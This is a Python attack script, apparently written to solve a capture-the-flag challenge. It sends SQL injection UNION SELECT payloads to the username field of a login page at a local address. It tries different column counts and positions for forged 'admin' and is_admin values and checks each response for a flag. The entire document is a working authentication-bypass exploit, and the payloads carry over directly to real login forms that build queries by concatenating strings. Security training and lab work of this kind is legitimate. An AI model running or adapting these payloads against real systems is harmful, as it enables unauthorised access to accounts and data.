import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[NEW APPROACH] Control the query result completely with UNION\n")
print("The backend probably does something like:")
print("  SELECT * FROM users WHERE username='X' AND password='Y'")
print("  Then checks if result['is_admin'] == 1 or result['role'] == 'admin'\n")

# Let's try exhaustive UNION SELECT with different values in each position
print("="*80)
print("[SYSTEMATIC UNION SELECT TEST]")
print("Testing 'admin' string in each position of 5-column UNION")
print("="*80)

for admin_column in range(1, 6):
    cols = []
    for i in range(1, 6):
        if i == admin_column:
            cols.append("'admin'")
        else:
            cols.append(f"'{i}'")
    
    union_cols = ','.join(cols)
    payload = f"' UNION SELECT {union_cols}-- -"
    
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"Admin value in column {admin_column}")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_error = "not the admin" in resp.text.lower()
    status = "✗ not admin" if has_error else f"? len={len(resp.text)}"
    print(f"[Column {admin_column}] {union_cols:50s} | {status}")

# Try with integer 1 (for is_admin=1) in different positions
print("\n" + "="*80)
print("[TESTING WITH is_admin=1 IN DIFFERENT POSITIONS]")
print("="*80)

for admin_column in range(1, 6):
    cols = []
    for i in range(1, 6):
        if i == admin_column:
            cols.append("1")  # is_admin flag
        else:
            cols.append("0")
    
    union_cols = ','.join(cols)
    payload = f"' UNION SELECT {union_cols}-- -"
    
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"is_admin=1 in column {admin_column}")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_error = "not the admin" in resp.text.lower()
    status = "✗ not admin" if has_error else f"? len={len(resp.text)}"
    print(f"[Column {admin_column}=1] {union_cols:30s} | {status}")

# Maybe it needs both username='admin' AND is_admin=1
print("\n" + "="*80)
print("[COMBINING 'admin' STRING + 1 FLAG]")
print("="*80)

combinations = [
    "'admin',1,0,0,0",
    "'admin',0,1,0,0",
    "'admin',0,0,1,0",
    "'admin',0,0,0,1",
    "1,'admin',0,0,0",
    "0,'admin',1,0,0",
    "0,'admin',0,1,0",
    "0,'admin',0,0,1",
    "'admin','password',1,0,0",
    "'admin','password',0,1,0",
]

for combo in combinations:
    payload = f"' UNION SELECT {combo}-- -"
    
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"Combination: {combo}")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_error = "not the admin" in resp.text.lower()
    status = "✗ not admin" if has_error else f"? len={len(resp.text)}"
    print(f"[{combo:35s}] | {status}")

# Let's try more columns (we saw ORDER BY worked up to 9)
print("\n" + "="*80)
print("[TESTING WITH MORE COLUMNS (6-9)]")
print("="*80)

for col_count in range(6, 10):
    # Try with 'admin' in first position and 1 in third position
    cols = ["'admin'", "'x'"] + ["1" if i == 2 else "0" for i in range(col_count-2)]
    union_cols = ','.join(cols)
    payload = f"' UNION SELECT {union_cols}-- -"
    
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"With {col_count} columns")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_error = "not the admin" in resp.text.lower()
    status = "✗ not admin" if has_error else f"? len={len(resp.text)}"
    print(f"[{col_count} cols] | {status}")

print("\n[COMPLETE] No flag found yet")

